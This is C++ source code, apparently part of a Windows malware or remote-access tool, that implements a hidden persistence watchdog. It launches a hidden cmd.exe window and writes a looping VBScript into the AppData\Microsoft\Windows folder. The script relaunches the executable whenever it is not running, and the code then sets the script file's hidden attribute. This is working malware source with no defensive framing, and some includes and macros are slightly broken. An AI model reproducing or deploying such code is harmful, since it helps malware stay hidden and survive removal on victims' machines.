#include <stdio.h>
#include <iostream>

std::string startLayer() {
	#define hide SW_HIDE 
	#if _DEBUG
		#define hide SW_SHOW 
	#endif

	LPTSTR cmdPath = _T("cmd.exe");
	std::string cmdArgs = "cmd.exe /k start " + (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs";
	ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, hide);
	return "";
}
std::string createLayer() {
	Helpers::killProcessByName("wscript.exe");
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	std::string Currentpath = Helpers::ExePath();


	std::ofstream outfile((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs");
	outfile << "Do" << std::endl;
	outfile << "sComputerName = \".\"" << std::endl;
	outfile << "Set objWMIService = GetObject(\"winmgmts:\\\\\" & sComputerName & \"\\root\\cimv2\")" << std::endl;
	//outfile << "sQuery = \"SELECT * FROM Win32_Process WHERE Name LIKE '%"+ Helpers::ExeName() +"%'\"" << std::endl;
	outfile << "sQuery = \"SELECT * FROM Win32_Process\"" << std::endl;
	outfile << "Set objItems = objWMIService.ExecQuery(sQuery)" << std::endl;


	outfile << "Dim found" << std::endl;
	outfile << "found = \"false\"" << std::endl;

	outfile << "For Each objItem In objItems" << std::endl;
	outfile << "If objItem.Name = \"" + Helpers::ExeName() + ".exe\" Then" << std::endl; //text.exe
	outfile << "found = \"true\"" << std::endl; //text.exe
	//#if _DEBUG
	//	outfile << "WScript.Echo \"Process[Name:\" & objItem.Name & \"]\"" << std::endl; //text.exe
	//#endif

		outfile << "End If" << std::endl; //text.exe
		//outfile << "End If" << std::endl; //text.exe
		//outfile << "Else" << std::endl; //text.exe
		outfile << "Next" << std::endl;

		outfile << "If found = \"false\" Then" << std::endl; //text.exe
		outfile << "Dim objShell" << std::endl; //text.exe
		outfile << "Set objShell = WScript.CreateObject(\"WScript.Shell\")" << std::endl; //text.exe
		outfile << "objShell.Run(\"" + Helpers::ExePath() + "\")" << std::endl; //text.exe
		outfile << "Set objShell = Nothing" << std::endl; //text.exe

	//#if _DEBUG
	//	outfile << "WScript.Echo \"Nice Try\"" << std::endl; //text.exe
	//#endif
	outfile << "End If" << std::endl; //text.exe

	outfile << "WScript.Sleep 1000" << std::endl; //text.exe

	outfile << "Loop" << std::endl;
	outfile.close(); 

	std::string filename = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs";
	int attr = GetFileAttributes(filename.c_str());
	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
		SetFileAttributes(filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
	}

	return "";
}

#pragma once
